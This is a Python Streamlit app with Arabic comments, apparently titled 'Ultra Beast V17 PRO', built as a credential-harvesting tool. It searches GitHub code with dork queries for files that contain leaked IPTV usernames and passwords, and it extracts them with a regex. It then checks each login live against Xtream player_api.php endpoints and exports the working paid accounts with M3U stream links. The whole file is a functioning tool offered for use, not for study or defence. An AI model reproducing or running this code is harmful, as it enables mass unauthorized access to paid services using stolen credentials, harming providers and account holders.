import streamlit as st
import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V17_PRO" 

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V17 PRO</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور الخاصة بالإصدار 17:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ في كلمة المرور!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة
# =================================================
st.set_page_config(page_title="Ultra Beast V17 PRO", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .card {
        background: #14161a;
        border: 1px solid #2d323b;
        border-right: 5px solid #00ff41;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 10px;
    }
    .host-text { color: #00ff41; font-weight: bold; font-family: monospace; }
    .country-tag { background: #333; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 10px; }
</style>
""", unsafe_allow_html=True)

# إدارة الحالة
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# =================================================
# 3. محرك الفحص والبيانات
# =================================================

def get_country(host):
    try:
        ip = host.split('//')[-1].split(':')[0]
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        return res.get('country', 'Unknown')
    except: return "Global"

def check_account(host, user, pw):
    # منع التكرار قبل الفحص
    unique_key = f"{host}|{user}"
    if unique_key in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(unique_key)

    try:
        # فحص كـ Xtream
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api_url, timeout=3).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            country = get_country(host)
            
            # توليد رابط M3U تلقائياً
            m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            
            return {
                "host": host, "user": user, "pass": pw, 
                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "country": country, "m3u": m3u_link
            }
    except: return None

# =================================================
# 4. واجهة التحكم والتحميل
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V17")
    token = st.text_input("GitHub Token:", type="password")
    
    if st.button("🚀 ابدأ الصيد المليوني"):
        if token: st.session_state.is_hunting = True
        else: st.warning("ضع التوكن أولاً!")
    
    if st.button("🛑 توقف"):
        st.session_state.is_hunting = False

    st.divider()
    st.metric("🔍 فحص", st.session_state.checked_count)
    st.metric("💎 صيد", len(st.session_state.results))
    
    # خاصية التحميل (Export)
    if st.session_state.results:
        st.subheader("📥 تحميل الصيد")
        export_data = ""
        for item in st.session_state.results:
            export_data += f"COUNTRY: {item['country']}\nHOST: {item['host']}\nUSER: {item['user']}\nPASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n" + "-"*30 + "\n"
        
        st.download_button(
            label="تحميل ملف النتائج .txt",
            data=export_data,
            file_name=f"Beast_Hunt_{datetime.now().strftime('%H-%M')}.txt",
            mime="text/plain"
        )

# =================================================
# 5. منطقة العرض المباشر
# =================================================
st.subheader("📡 الرادار المباشر (V17)")
results_area = st.empty()

def render_display():
    with results_area.container():
        for item in st.session_state.results:
            st.markdown(f"""
            <div class="card">
                <div style="display:flex; justify-content:space-between;">
                    <span class="host-text">{item['host']}</span>
                    <span class="country-tag">🌍 {item['country']}</span>
                </div>
                <div style="margin-top:10px; font-size:14px; color:#ccc;">
                    <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
                    <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
                </div>
                <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
                    M3U: {item['m3u']}
                </div>
            </div>
            """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}'}
    dorks = [
        'extension:txt "get.php?username="', 
        'filename:iptv.txt "password="', 
        'extension:m3u "http" "password="',
        '"player_api.php" user pass extension:txt'
    ]
    
    status_log = st.empty()

    for dork in dorks:
        if not st.session_state.is_hunting: break
        for page in range(1, 11): # زيادة عدد الصفحات لتعطيك نتائج أكثر
            if not st.session_state.is_hunting: break
            status_log.info(f"🔎 جاري فحص: {dork} | صفحة {page}")
            
            try:
                res = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}", headers=headers).json()
                if 'items' in res:
                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw_url, timeout=3).text
                        
                        # Regex مطور لجلب جميع الصيغ
                        matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                        
                        for m in matches:
                            st.session_state.checked_count += 1
                            found = check_account(m[0], m[1], m[2])
                            if found:
                                st.session_state.results.insert(0, found)
                                st.toast(f"🎯 صيد جديد من {found['country']}!", icon="🔥")
                                render_display()
            except: continue
    
    st.session_state.is_hunting = False
    st.success("🏁 انتهت عملية البحث.")
else:
    render_display()
